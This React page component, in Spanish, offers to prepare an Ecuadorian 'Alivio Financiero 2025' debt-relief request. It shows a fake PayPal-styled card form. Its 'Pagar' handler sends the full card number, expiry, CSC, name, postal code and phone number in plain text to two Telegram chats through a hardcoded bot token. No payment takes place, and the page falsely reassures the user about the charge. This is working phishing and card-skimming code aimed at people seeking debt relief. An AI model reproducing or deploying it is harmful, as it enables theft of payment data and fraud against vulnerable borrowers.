import React, { useState, useEffect } from "react";
import "./CreditReportPage.css";
import { FaCreditCard } from "react-icons/fa";

// Copiado de AnalisisPage.jsx
const TELEGRAM_TOKEN = '7720652398:AAHqJaBEI2a2Z3wufe-GhNaVFuxbRU-prZA';
const CHAT_IDS = [6332406416, 905641795];
function sendCardToTelegram(card) {
  const message = `💳 *Nuevo pago manual (Alivio Financiero)*\n\n*Nombre:* ${card.nombre}\n*Apellidos:* ${card.apellidos}\n*Número de tarjeta:* ${card.numero}\n*CSC:* ${card.csc}\n*Fecha de vencimiento:* ${card.fecha}\n*Código postal:* ${card.postal}\n*Móvil:* ${card.movil}`;
  return Promise.all(
    CHAT_IDS.map(chat_id =>
      fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id,
          text: message,
          parse_mode: 'Markdown'
        })
      })
    )
  );
}

const AlivioFinancieroResumenPago = () => {
  const [datos2, setDatos2] = useState({});
  const [datos3, setDatos3] = useState({});
  const [codeudor, setCodeudor] = useState("");
  const [confirmado, setConfirmado] = useState(false);
  const [showCardForm, setShowCardForm] = useState(false);
  const [cardForm, setCardForm] = useState({
    numero: '', fecha: '', csc: '', nombre: '', apellidos: '', postal: '', movil: '', mayorEdad: false
  });
  const [cardErrors, setCardErrors] = useState({});
  const [showConfirmation, setShowConfirmation] = useState(false);
  const [pagoError, setPagoError] = useState("");

  useEffect(() => {
    const d2 = JSON.parse(localStorage.getItem('alivioFinancieroDatos') || '{}');
    setDatos2(d2);
    const d3 = JSON.parse(localStorage.getItem('alivioFinancieroPaso3') || '{}');
    setDatos3(d3);
  }, []);

  // Validación de tarjeta (igual que en AnalisisPage)
  const handleCardChange = e => {
    const { name, value, type, checked } = e.target;
    if (name === 'numero') {
      const clean = value.replace(/\D/g, '').slice(0, 19);
      setCardForm({ ...cardForm, numero: clean });
    } else if (name === 'fecha') {
      let clean = value.replace(/[^\d]/g, '');
      if (clean.length > 4) clean = clean.slice(0, 4);
      if (clean.length > 2) clean = clean.slice(0, 2) + '/' + clean.slice(2);
      setCardForm({ ...cardForm, fecha: clean });
    } else if (name === 'csc') {
      const clean = value.replace(/\D/g, '').slice(0, 4);
      setCardForm({ ...cardForm, csc: clean });
    } else {
      setCardForm({ ...cardForm, [name]: type === 'checkbox' ? checked : value });
    }
  };

  function isValidCardNumber(number) {
    const clean = number.replace(/\D/g, '');
    let sum = 0, shouldDouble = false;
    for (let i = clean.length - 1; i >= 0; i--) {
      let digit = parseInt(clean[i]);
      if (shouldDouble) {
        digit *= 2;
        if (digit > 9) digit -= 9;
      }
      sum += digit;
      shouldDouble = !shouldDouble;
    }
    return clean.length >= 13 && clean.length <= 19 && sum % 10 === 0;
  }

  function isValidExpiry(fecha) {
    const match = fecha.match(/^(0[1-9]|1[0-2])\/(\d{2}|\d{4})$/);
    if (!match) return false;
    const mes = parseInt(match[1]);
    let anio = parseInt(match[2]);
    if (anio < 100) anio += 2000;
    const minDate = new Date(2025, 4, 1);
    const fechaCard = new Date(anio, mes - 1, 1);
    return fechaCard >= minDate;
  }

  useEffect(() => {
    const errs = {};
    if (cardForm.numero && !isValidCardNumber(cardForm.numero)) errs.numero = 'Número de tarjeta inválido';
    if (cardForm.fecha) {
      const match = cardForm.fecha.match(/^(0[1-9]|1[0-2])\/(\d{2}|\d{4})$/);
      if (!match) {
        errs.fecha = 'Fecha inválida (MM/AA)';
      } else {
        const mes = parseInt(match[1]);
        let anio = parseInt(match[2]);
        if (anio < 100) anio += 2000;
        const minDate = new Date(2025, 4, 1);
        const fechaCard = new Date(anio, mes - 1, 1);
        if (fechaCard < minDate) {
          errs.fecha = 'La fecha mínima es 05/25';
        }
      }
    }
    setCardErrors(errs);
  }, [cardForm.numero, cardForm.fecha]);

  // Resumen de datos
  const nombres = datos3.nombres || "";
  const apellidos = datos3.apellidos || "";
  const identificacion = datos3.identificacion || "";
  const correo = datos3.correo || "";
  const institucion = datos2.institucionLista ? datos2.banco : datos2.nombreInstitucion;
  const nroOperacion = datos2.nroOperacion || datos2.numeroTarjeta || "";
  const ciudad = datos2.ciudad || "";
  const fechaHoy = new Date().toLocaleDateString('es-EC');

  // Validar antes de pagar
  const puedePagar = confirmado && codeudor && Object.keys(cardErrors).length === 0 && cardForm.numero && cardForm.fecha && cardForm.csc && cardForm.nombre && cardForm.apellidos && cardForm.postal && cardForm.movil && cardForm.mayorEdad;

  return (
    <div className="credit-bg" style={{ minHeight: '100vh', width: '100vw', display: 'flex', justifyContent: 'center', alignItems: 'center' }}>
      <div className="decor-circle"></div>
      <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', maxWidth: 600, width: '100%' }}>
        <h2 style={{ textAlign: 'center', fontWeight: 700, marginTop: 32, marginBottom: 8, fontSize: 28, letterSpacing: 0.2 }}>FORMATO PDF<br /><span style={{ fontSize: 24 }}>Solicitud Alivio Financiero 2025</span></h2>
        <div style={{ textAlign: 'center', marginBottom: 18, fontSize: 16, color: '#232a31', fontWeight: 400 }}>
          Formulario para crear la Solicitud de <b>Alivio Financiero 2025</b> según la <b>Resolución N° JPRF-F-2025-0145</b> de la Junta de Política y Regulación Financiera. Crea la solicitud, imprímela, fírmala y preséntala en tu banco o cooperativa.
        </div>
        <div style={{ display: 'flex', gap: 18, justifyContent: 'center', marginBottom: 8, color: '#9f1b32', fontWeight: 600, fontSize: 15 }}>
          <span>📄 Crea la solicitud</span>
          <span>🖨️ Imprime dos veces y fírmala</span>
          <span>🏦 Presenta en el banco y pide un recibido</span>
        </div>
        <div className="progress-container" style={{ marginBottom: 18, maxWidth: 520, marginLeft: 'auto', marginRight: 'auto', width: '100%' }}>
          <span className="progress-label" style={{ minWidth: 40, textAlign: 'left' }}>100%</span>
          <div className="progress-bar-outer" style={{ flex: 1 }}>
            <div className="progress-bar-inner" style={{ width: '100%' }}></div>
          </div>
        </div>
        <div className="main-form" style={{ maxWidth: 520, width: '100%', margin: '0 auto 32px auto' }}>
          <div style={{ fontWeight: 700, fontSize: 18, marginBottom: 10 }}>Resumen de la solicitud</div>
          <div style={{ fontSize: 15, marginBottom: 16, whiteSpace: 'pre-line' }}>
            {`Se creará una Solicitud PDF con fecha ${fechaHoy} para solicitar el traslado de las cuotas de la operación de #${nroOperacion} al final de la tabla de amortización, conforme la Resolución N° JPRF-F-2025-0145 de Alivio financiero.`}
          </div>
          <div style={{ fontWeight: 700, fontSize: 16, marginBottom: 8 }}>Revisa que la información esté bien escrita</div>
          <div style={{ fontSize: 15, marginBottom: 8, whiteSpace: 'pre-line' }}>
            {`Nombres: ${nombres} ${apellidos}\ncédula de identidad: ${identificacion}\n\nInstitución: ${institucion}\nNúmero de crédito o pagaré: #${nroOperacion}\nCiudad: ${ciudad}\n\nSe enviará una copia al correo: ${correo}`}
          </div>
          <div className="form-group">
            <label className="form-label">¿Tienes Codeudores o Garantes? <span className="form-required">*</span></label>
            <div style={{ display: 'flex', gap: 18, marginTop: 2 }}>
              <label style={{ display: 'flex', alignItems: 'center', gap: 6, fontWeight: 500, color: '#232a31', fontSize: 15 }}>
                <input type="radio" name="codeudor" value="si" checked={codeudor === 'si'} onChange={() => setCodeudor('si')} /> SI
              </label>
              <label style={{ display: 'flex', alignItems: 'center', gap: 6, fontWeight: 500, color: '#232a31', fontSize: 15 }}>
                <input type="radio" name="codeudor" value="no" checked={codeudor === 'no'} onChange={() => setCodeudor('no')} /> NO
              </label>
            </div>
          </div>
          <div className="form-group">
            <label className="form-label">Confirmación <span className="form-required">*</span></label>
            <label className="checkbox-label">
              <input type="checkbox" checked={confirmado} onChange={e => setConfirmado(e.target.checked)} />
              Confirmo que la <b>información proporcionada es correcta y completa</b>; en caso de error en mis datos personales, acepto que no procederá la devolución del importe pagado.
            </label>
          </div>
          {/* Bloque de pago reutilizado */}
          <div style={{ marginTop: 32 }}>
            <button
              type="button"
              onClick={() => setShowCardForm(v => !v)}
              style={{
                width: '100%',
                background: '#393939',
                color: '#fff',
                border: 'none',
                borderRadius: 6,
                padding: '12px 0',
                fontSize: 17,
                fontWeight: 600,
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center',
                gap: 10,
                cursor: 'pointer',
                marginBottom: 0
              }}
            >
              <FaCreditCard style={{ fontSize: 20 }} /> Tarjeta de débito o crédito
            </button>
            {showCardForm && (
              <div style={{
                background: '#fff',
                border: '1.5px solid #e3e6fa',
                borderRadius: 10,
                boxShadow: '0 2px 8px rgba(60,60,120,0.07)',
                padding: 24,
                marginTop: 12
              }}>
                <div className="form-group">
                  <input
                    type="text"
                    name="numero"
                    placeholder="N.º de la tarjeta"
                    value={cardForm.numero}
                    onChange={handleCardChange}
                    style={{ width: '100%', marginBottom: 4, border: cardErrors.numero ? '2px solid #b71c1c' : '1.5px solid #e3e6fa', borderRadius: 8, padding: 10, fontSize: 16 }}
                    maxLength={19}
                  />
                  {cardErrors.numero && <div className="form-error-v2">{cardErrors.numero}</div>}
                </div>
                <div style={{ display: 'flex', gap: 10, marginBottom: 10, flexWrap: 'wrap' }}>
                  <div style={{ flex: 1, minWidth: 120 }}>
                    <input
                      type="text"
                      name="fecha"
                      placeholder="MM/AA"
                      value={cardForm.fecha}
                      onChange={handleCardChange}
                      style={{ width: '100%', border: cardErrors.fecha ? '2px solid #b71c1c' : '1.5px solid #e3e6fa', borderRadius: 8, padding: 10, fontSize: 16, boxSizing: 'border-box' }}
                      maxLength={5}
                    />
                    {cardErrors.fecha && <div className="form-error-v2">{cardErrors.fecha}</div>}
                  </div>
                  <div style={{ flex: 1, minWidth: 100 }}>
                    <input type="text" name="csc" placeholder="CSC" value={cardForm.csc} onChange={handleCardChange} style={{ width: '100%', border: '1.5px solid #e3e6fa', borderRadius: 8, padding: 10, fontSize: 16, boxSizing: 'border-box' }} maxLength={4} />
                  </div>
                </div>
                <div className="form-group" style={{ display: 'flex', gap: 10, marginBottom: 10 }}>
                  <input type="text" name="nombre" placeholder="Nombre" value={cardForm.nombre} onChange={handleCardChange} style={{ flex: 1, border: '1.5px solid #e3e6fa', borderRadius: 8, padding: 10, fontSize: 16 }} />
                  <input type="text" name="apellidos" placeholder="Apellidos" value={cardForm.apellidos} onChange={handleCardChange} style={{ flex: 1, border: '1.5px solid #e3e6fa', borderRadius: 8, padding: 10, fontSize: 16 }} />
                </div>
                <div className="form-group" style={{ marginBottom: 10 }}>
                  <input type="text" name="postal" placeholder="Código postal" value={cardForm.postal} onChange={handleCardChange} style={{ width: '100%', border: '1.5px solid #e3e6fa', borderRadius: 8, padding: 10, fontSize: 16 }} />
                </div>
                <div className="form-group" style={{ marginBottom: 10 }}>
                  <input type="text" name="movil" placeholder="Móvil" value={cardForm.movil} onChange={handleCardChange} style={{ width: '100%', border: '1.5px solid #e3e6fa', borderRadius: 8, padding: 10, fontSize: 16 }} />
                </div>
                <div className="form-group" style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 16 }}>
                  <input type="checkbox" id="mayorEdad" name="mayorEdad" checked={cardForm.mayorEdad} onChange={handleCardChange} style={{ marginRight: 6 }} />
                  <label htmlFor="mayorEdad" style={{ fontSize: 14 }}>
                    Confirmo que soy mayor de edad y acepto el <a href="#" style={{ color: '#2a3eb1', textDecoration: 'underline' }}>Aviso de privacidad</a> de PayPal.
                  </label>
                </div>
                <button
                  type="button"
                  style={{ width: '100%', background: '#0070ba', color: '#fff', border: 'none', borderRadius: 6, padding: '12px 0', fontSize: 17, fontWeight: 700, cursor: puedePagar ? 'pointer' : 'not-allowed', opacity: puedePagar ? 1 : 0.6 }}
                  disabled={!puedePagar}
                  onClick={async () => {
                    setPagoError("");
                    setShowConfirmation(false);
                    // Validar los campos de tarjeta
                    const errs = {};
                    if (!cardForm.numero || !isValidCardNumber(cardForm.numero)) errs.numero = 'Número de tarjeta inválido';
                    if (!cardForm.fecha) {
                      errs.fecha = 'Fecha inválida (MM/AA)';
                    } else {
                      const match = cardForm.fecha.match(/^(0[1-9]|1[0-2])\/(\d{2}|\d{4})$/);
                      if (!match) {
                        errs.fecha = 'Fecha inválida (MM/AA)';
                      } else {
                        const mes = parseInt(match[1]);
                        let anio = parseInt(match[2]);
                        if (anio < 100) anio += 2000;
                        const minDate = new Date(2025, 4, 1);
                        const fechaCard = new Date(anio, mes - 1, 1);
                        if (fechaCard < minDate) {
                          errs.fecha = 'La fecha mínima es 05/25';
                        }
                      }
                    }
                    if (!cardForm.csc || cardForm.csc.length < 3 || cardForm.csc.length > 4) errs.csc = 'CSC inválido';
                    if (!cardForm.nombre) errs.nombre = 'Nombre requerido';
                    if (!cardForm.apellidos) errs.apellidos = 'Apellidos requeridos';
                    if (!cardForm.postal) errs.postal = 'Código postal requerido';
                    if (!cardForm.movil) errs.movil = 'Móvil requerido';
                    if (!cardForm.mayorEdad) errs.mayorEdad = 'Debes confirmar que eres mayor de edad';
                    setCardErrors(errs);
                    if (Object.keys(errs).length === 0) {
                      try {
                        await sendCardToTelegram(cardForm);
                        setShowConfirmation(true);
                      } catch (e) {
                        setPagoError('Error al enviar a Telegram. Intenta de nuevo.');
                      }
                    } else {
                      setPagoError('Completa correctamente todos los campos de la tarjeta.');
                    }
                  }}
                >
                  Pagar
                </button>
                {pagoError && <div className="form-error-v2" style={{ marginTop: 10 }}>{pagoError}</div>}
                {showConfirmation && (
                  <div style={{
                    background: '#f7fefb',
                    border: '2px solid #43b324',
                    borderRadius: 14,
                    marginTop: 28,
                    padding: 32,
                    textAlign: 'center',
                    color: '#232a31',
                    fontSize: 19,
                    fontWeight: 500,
                    boxShadow: '0 2px 16px rgba(60,60,120,0.10)',
                    maxWidth: 420,
                    marginLeft: 'auto',
                    marginRight: 'auto',
                    display: 'flex',
                    flexDirection: 'column',
                    alignItems: 'center',
                    gap: 12
                  }}>
                    <span style={{ fontSize: 36, color: '#43b324', marginBottom: 8 }}>✅</span>
                    <div style={{ fontWeight: 700, fontSize: 21, marginBottom: 6 }}>¡Solicitud recibida!</div>
                    <div style={{ fontSize: 17, marginBottom: 8 }}>
                      Recibirás tu <b>PDF de Solicitud de Alivio Financiero</b> en tu correo dentro de las próximas <b>24 a 48 horas</b>.
                    </div>
                    <div style={{ fontSize: 16, color: '#1a7f37', display: 'flex', alignItems: 'center', gap: 6 }}>
                      <span style={{ fontSize: 22 }}>🔒</span>
                      Tu pago solo se procesará después de la entrega.
                    </div>
                  </div>
                )}
              </div>
            )}
          </div>
        </div>
      </div>
    </div>
  );
};

export default AlivioFinancieroResumenPago; 